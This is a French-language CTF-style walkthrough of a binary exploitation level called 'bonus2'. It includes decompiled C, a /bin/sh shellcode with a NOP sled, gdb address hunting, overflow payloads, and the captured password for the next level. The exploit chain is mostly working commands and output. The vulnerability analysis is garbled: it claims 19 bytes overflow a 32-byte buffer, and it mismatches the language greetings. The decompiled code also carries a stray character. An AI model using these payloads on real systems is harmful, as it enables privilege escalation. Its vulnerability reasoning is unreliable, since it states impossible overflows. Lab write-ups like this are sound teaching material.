# BONUS 2
## Walkthrough

Voici les étapes suivit pour accéder au niveau supérieur, soit le `bonus3`.

1. Une fois connecté à la VM sur le `bonus2`, l'on retrouve un fichier `bonus2` situé à la racine du dossier utilisateur. Ce dernier s'avère être de nouveau un exécutable ELF (Executable and Linkable Format).

2. On extrait ce fichier sur la machine host soit en utilisant la commande `scp` soit en utilisant un logiciel créer à cet effet.

	```sh
	> scp -P 4242 bonus2@127.0.0.1:bonus2 /path/on/machine/host
	```

3. On ouvre ensuite ce fichier dans Ghidra et après analyse, on obtient le désassemblage ci-dessous (que l'on refactorise pour plus de clarté).

    ```sh
    #include <stdlib.h>
    #include <stdio.h>
    #include <string.h>
    #include <unistd.h>
    #include <sys/types.h>
    #include <time.h>
    #include <stdbool.h>

    int language = 0;

    int greetuser()
    {
    	unsigned char hello[30];
    	unsigned char local_var;

    	if (language == 1) {
    		hello[0] = 'H';
    		hello[1] = 'y';
    		hello[2] = 'v';
    		hello[3] = '\xc3';
    		hello[4] = '\xa4';
    		hello[5] = '\xc3';
    		hello[6] = '\xa4';
    		hello[7] = ' ';
    		hello[8] = 'p';
    		hello[9] = '\xc3';
    		hello[10] = '\xa4';
    		hello[11] = 'i';
    		hello[12] = 'v';
    		hello[13] = '\xc3';
    		hello[14] = '\xa4';
    		hello[15] = '\xc3';
    		hello[16] = '\xa4';
    		hello[17] = '\0';
    	} else if (language == 2) {
    		hello[0] = 'G';
    		hello[1] = 'o';
    		hello[2] = 'e';
    		hello[3] = 'd';
    		hello[4] = 'e';
    		hello[5] = 'm';
    		hello[6] = 'i';
    		hello[7] = 'd';
    		hello[8] = 'd';
    		hello[9] = 'a';
    		hello[10] = 'g';
    		hello[11] = '!';
    		hello[12] = '\0';
    	} else if (language == 0) {
    		hello[0] = 'H';g
    		hello[1] = 'e';
    		hello[2] = 'l';
    		hello[3] = 'l';
    		hello[4] = 'o';
    		hello[5] = '\0';
    	}
    	strcat(hello, (char*) &local_var);
    	puts(hello);
    	return EXIT_SUCCESS;
    }

    int main(int ac, char *argv)
    {
    	char* env_lang;
    	int buffer[10];
    	char buffer_copy[36];

    	if (ac == 3) {
    		memset(buffer, 0, sizeof(buffer));

    		strncpy(buffer, argv[1], 40);
    		strncpy(buffer_copy, argv[2], 32);

    		env_lang = getenv("LANG");
    		if (env_lang != NULL)
    		{
    			if (memcmp(env_lang, "nl", 2) == 0) {
    				language = 1;
    			}
    			else if (memcmp(env_lang, "fi", 2) == 0) {
    				language = 2;
    			}
    		}

    		memcpy(buffer_copy, buffer, 19);
    		return greetuser();
    	}
    	return EXIT_FAILURE;
    }
    ```

    À partir de ce désassemblage, on en déduit que notre programme comporte deux fonctions : une fonction `main` et une fonction `greetuser`. On peut également constater une variable globale `language` initialisée à zéro qui sera utilisée tout au long du programme.

    Dans un premier temps, la fonction `main` prend deux arguments en ligne de commande, soit `argv[1]` et `agrv[2]`. Elle copie les deux arguments dans des tampons, `buffer` et `buffer_copy`, respectivement. Elle vérifie ensuite la variable d'environnement `LANG` pour déterminer la valeur de language : si `LANG` commence par `nl`, la variable globale `language` est mis à `1`, et s'il commence par `fi`, cette dernière est mis à `2`. Enfin, la fonction `main` copie les premiers `19 octets` de `buffer` dans `buffer_copy` et appelle la fonction `greetuser` dans une `return`.

    Dans un second temps, la fonction `greetuser` construit une chaîne de caractères `hello` en fonction de la valeur de la variable globale `language`. Plus précisément, elle utilise une logique de conditions `if` pour déterminer la langue et construit une salutation en conséquence, `Goedemiddag!\0` si 'language' est `2`, soit si la variable d'environnement `LANG` commence par `fi`. Une fois `hello` construit, la fonction concatene la chaine de caractère `hello` et `local_var`, une variable `char` définie au début de la fonction.

    Le code présente plusieurs vulnérabilités majeures :
    - Premièrement, dans la fonction `greetuser()`, l'utilisation de `strcat` peut causer un dépassement de tampon, car la taille statique de `hello` (`30 octets`) est insuffisante pour accueillir `local_var` (`1 octet`), entraînant des risques de sécurité.
    - Deuxièmement, dans la fonction `main()`, le transfert des premiers `19 octets` de `buffer` vers `buffer_copy` dépasse la taille allouée pour ce dernier (`32 octets`), pouvant provoquer des écritures hors limites et des vulnérabilités.
    - Enfin, l'appel ultérieur de `greetuser()` avec des données potentiellement altérées dans `buffer_copy` expose le programme à un risque accru de dépassement de tampon lors de la concaténation de `local_var` avec la chaîne `hello`. Ces vulnérabilités pourraient être exploitées pour influencer le flux d'exécution, compromettre l'intégrité du programme et causer des problèmes de sécurité significatifs.

4. Avant tout, il est crucial de noter que le programme initial ne comporte pas d'instructions permettant l'exécution d'un `shell interactif` ou l'affichage du contenu de `/home/user/bonus3/.pass`. Par conséquent, pour atteindre ces objectifs, l'utilisation d'un `shellcode` est nécessaire : on utilise le `shellcode` permettant d'exécuter un `shell interactif` et que l'on stocke dans la variable d'environnement `SHELLCODE` (même `shellcode` que les précédents niveaux). À partir de là, l'idée ici est de générer deux payloads, un pour `argv[1]` et l'autre pour `argv[2]`. Le premier doit remplir entièrement la variable `buffer` à l'aide de la fonction `strncpy`, nécessitant donc un `payload` de taille `40`. Le second doit être construit de manière à provoquer un dépassement de tampon dans `buffer_copy`. On doit également y injecter le `shellcode` dont l'exécution est déclenchée par la manipulation ultérieure des opérations dans la fonction `greetuser`, permettant de contrôler ainsi l'exécution du programme.

   Shellcode :

    ```sh
    "\x31\xc0\x50\x68\x2f\x2f\x73"
    "\x68\x68\x2f\x62\x69\x6e\x89"
    "\xe3\x89\xc1\x89\xc2\xb0\x0b"
    "\xcd\x80\x31\xc0\x40\xcd\x80"
    ```

    Lien : https://shell-storm.org/shellcode/files/shellcode-811.html


5. Dans un premier, l'on va donc créer une variable d'environnement `SHELLCODE` contenant le `shellcode` précédemment mentionné.

    ```sh
    > export SHELLCODE=$(python -c 'print "\x90" * 100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"')
    ```

    On a :
    - `'\x90' * 100` : 100 fois le caractère `NOP` (`0x90`) pour se déplacer jusqu'au `shellcode` ;
	- `\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80` : Le `shellcode` en question.

6. Dans un deuxième temps, on doit trouver l'adresse de ce `shellcode` afin de pouvoir l'injecter dans notre second argument/`payload`. Pour ce faire, on exécute le programme via `gdb` et lance les commandes suivantes :

    ```sh
    > gdb bonus2
    > (gdb) disas main
		Dump of assembler code for function main:
			[...]
			0x080485a6 <+125>:	call   0x8048380 <getenv@plt>
			[...]
		End of assembler dump.
	> (gdb) b *main+125
		Breakpoint 1 at 0x80485a6
	> (gdb) run test test
		Starting program: /home/user/bonus2/bonus2 test test
		Breakpoint 1, 0x080485a6 in main ()
	> (gdb) x/100s *((char**)environ)
		0xbffff893:	 "SHELLCODE=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\061\300Ph//shh/bin\211\343\211\301\211\302\260\v\315\200\061\300@\315\200"
		[...]
	```

	Ainsi, l'adresse `0xbffff893` est identifiée comme pointant vers le début de la chaîne de caractères stockée dans la variable d'environnement `SHELLCODE`. Cependant, pour garantir une redirection précise vers le début du `shellcode`, il est nécessaire d'ajuster cette adresse avec un offset de `18` (plus ou moins). Ainsi, l'adresse ajustée devient` 0xbffff8a5`, soit `\xa5\xf8\xff\xbf` en format `little-endian`. Cette manipulation permet de diriger le flux d'exécution vers le `shellcode`.

7. Maintenant que l'on possède l'adresse de la variable d'environnement `SHELLCODE` on peut passer à la création des `payloads`.

    Premier `payload` :

    ```sh
    python -c 'print "M" * 40'
    ```
    On a :
    - `'print "M" * 40'` : Une chaise de `40 caracteres` pour remplir le `buffer` via le `strncpy(buffer, argv[1], 40)`.

    Second `payload` :

    ```sh
    python -c 'print "\x90" * 18 + "\xa5\xf8\xff\xbf"'
    ```

    On a :
    - `"\x90" * 18` : `18 caractères` pour `buffer overflow` ;
    - `\xa5\xf8\xff\xbf` : L'adresse de `SHELLCODE` avec un décalage de `18` en format `little-endian`.

    On a noter que, avec moins de 18, ou plus de 18 caracteres, le programme ne fonctionne pas et `segfault`.

8. Il manque plus qu'à initialiser la variable d'environnement `LANG` à `fi` et de lancer le programme avec les `payloads` précédemment définies pour `buffer overflow` et lancer le `shell interactif`. On exécute la fonction `whoami` pour s'assurer que l'on est bien l'utilisateur `bonus3` et non plus l'utilisateur `bonus2`. Enfin, on `cat` le fichier `/home/user/bonus3/.pass` pour obtenir le mot de passe.

    ```sh
    > export LANG=fi
    > ./bonus2 $(python -c 'print "M" * 40') $(python -c 'print "\x90" * 18 + "\xa5\xf8\xff\xbf"')
    > whoami
    bonus3
    > cat /home/user/bonus3/.pass
    71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
    ```

9. On peut à présent passer au niveau supérieur en exécutant la commande `su bonus3` et en y spécifiant le mot de passe qui vient d'être trouvée.

    ```sh
    > su bonus3
    Password :
    > 71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
    ```










